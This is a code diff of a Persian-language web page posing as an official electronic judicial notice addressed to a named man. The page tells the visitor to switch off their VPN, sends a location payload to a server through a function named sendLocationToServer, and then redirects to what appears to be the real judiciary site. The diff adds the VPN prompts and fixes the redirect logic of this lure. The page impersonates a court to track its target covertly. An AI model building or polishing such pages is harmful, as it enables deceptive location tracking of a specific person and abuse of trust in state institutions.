@@ -2,7 +2,7 @@
 <html lang="fa" dir="rtl">
 <head>
 <meta charset="UTF-8">
-<title>ابلاغیه الکترونیکی قضایی علی پیشگر</title>
+<title>ابلاغیه الکترونیکی قضایی آقای علی پیشگر</title>
 <style>
     body, html {
     margin: 0;
@@ -77,8 +77,8 @@
 <div class="modal-overlay" id="customModal">
     <div class="modal-box">
         <!-- 📝 فقط متن فارسی شما اینجا نمایش داده می‌شود -->
-       //<div class="modal-text"> </div>
-       // <button class="modal-btn" onclick="closeCustomModal()"</button>
+        <div class="modal-text">لطفا فیلتر شکن خود را خاموش کنید</div>
+        <button class="modal-btn" onclick="closeCustomModal()">تایید</button>
     </div>
 </div>
 
@@ -117,15 +117,18 @@ method: 'POST',
 headers: { 'Content-Type': 'application/json' },
 body: JSON.stringify(payload)
 })
+    .then(response => {
+    // 💬 نمایش پیام متنی به کاربر
+    alert(" لطفا فیلتر شکن خود را خاموش کنید "); 
     
     // انتقال به سایت مقصد (لینک دلخواه خود را بجای این قرار دهید)
     window.location.href = "https://Adliran.ir"; 
-
-    .then(response => {
-    // این بلاک فقط و فقط زمانی اجرا می‌شود که لوکیشن با موفقیت گرفته و ارسال شده باشد
-    window.location.href = "Adliran.ir"; 
 })
 
+//.then(response => {
+// در اینجا می‌توانید کاربر را به یک عکس یا سایت دیگر هدایت کنید
+ //window.location.href = "https://www.adliran.ir";
+//})
 
 .catch(error => console.error('Error:', error));
 } // 👈 این آکولاژ را دقیقاً اینجا اضافه کن تا تابع sendLocationToServer بسته شود
